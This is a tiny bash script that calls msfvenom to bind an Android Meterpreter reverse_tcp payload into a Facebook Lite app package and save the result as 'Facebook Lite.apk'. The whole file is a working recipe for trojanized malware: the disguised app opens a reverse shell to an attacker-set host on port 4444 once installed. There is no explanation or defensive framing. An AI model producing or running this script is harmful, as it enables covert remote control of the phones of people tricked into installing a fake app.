#!/bin/bash
payload="android/meterpreter/reverse_tcp"
lhost="ip address"
lport="4444"
aplikasi="facebook_lite.apt"
hasil="Facebook Lite.apk"
msfvenom -p "${payload}"  LHOST="${lhost}" LPORT="${lport}" -x "${aplikasi}" R > "${hasil}"
